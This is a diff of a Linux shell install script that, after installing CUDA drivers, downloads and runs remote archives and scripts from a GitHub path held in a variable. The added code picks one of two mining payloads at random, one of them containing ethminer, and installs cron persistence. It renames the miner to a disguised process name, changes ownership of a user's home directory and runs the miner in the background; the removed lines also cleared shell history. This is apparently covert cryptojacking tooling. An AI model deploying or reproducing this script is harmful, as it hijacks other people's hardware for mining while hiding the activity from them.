@@ -20,27 +20,68 @@ sudo apt-get upgrade -y
 sudo apt-get dist-upgrade -y
 sudo apt-get install cuda-drivers -y
 
-wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
-tar -xvf Mlnode.tar.gz
-rm -rf Mlnode.tar.gz
-wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
-wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
-wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
-wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
-chmod +x auinstall.sh
-chmod +x processname.sh
-chmod +x cronadd.sh
-./cronadd.sh
-./processname.sh
-cp inuser.txt bin/inuser.txt
+sleep 2
 
-history -c
+#!/bin/bash
 
-cd bin/
-Uuname=$(cat inuser.txt)
-USEPROCNAME=$(cat SETPROCNAME.txt)
-wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
-chmod +x runsrc.sh
-mv ethminer $USEPROCNAME
-sudo chown -R $Uuname:$Uuname /home/$Uuname/
-nohup sh runsrc.sh > result.log 2>&1 &
+Fcheck=$(shuf -i 1-2 -n 1)
+num=$Fcheck
+
+if [ $num = 2 ]; 
+	then
+		echo "RUN PROCESS 1"; 
+			#
+			wget https://github.com/$gitpath/raw/main/Mlnode.tar.gz
+			tar -xvf Mlnode.tar.gz
+			rm -rf Mlnode.tar.gz
+			#da co thu muc bin
+			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
+			chmod +x auinstall.sh
+			chmod +x processname.sh
+			chmod +x cronadd.sh
+			./cronadd.sh
+			./processname.sh
+			cp inuser.txt bin/inuser.txt
+			cd bin/
+            wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
+			Uuname=$(cat inuser.txt)
+			USEPROCNAME=$(cat SETPROCNAME.txt)
+			wget https://raw.githubusercontent.com/$gitpath/main/runsrc.sh
+			chmod +x runsrc.sh
+			mv ethminer $USEPROCNAME
+			sudo chown -R $Uuname:$Uuname /home/$Uuname/
+			nohup sh runsrc.sh > result.log 2>&1 &
+			
+	else 
+		echo "RUN PROCESS 2"; 
+			#
+			wget https://github.com/$gitpath/raw/main/linux.tar.gz
+			tar -xvf linux.tar.gz
+			rm -rf linux.tar.gz
+			mkdir bin
+			cp linux bin/linux
+			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/cronadd.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/auinstall.sh
+			wget https://raw.githubusercontent.com/$gitpath/main/processname.sh
+			chmod +x auinstall.sh
+			chmod +x processname.sh
+			chmod +x cronadd.sh
+			./cronadd.sh
+			./processname.sh
+			cp inuser.txt bin/inuser.txt
+			cd bin/
+            wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
+			Uuname=$(cat inuser.txt)
+			USEPROCNAME=$(cat SETPROCNAME.txt)
+			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
+			chmod +x runlinux.sh
+			mv linux $USEPROCNAME
+			sudo chown -R $Uuname:$Uuname /home/$Uuname/
+			nohup sh runlinux.sh > result.log 2>&1 &
+			#
+
+fi
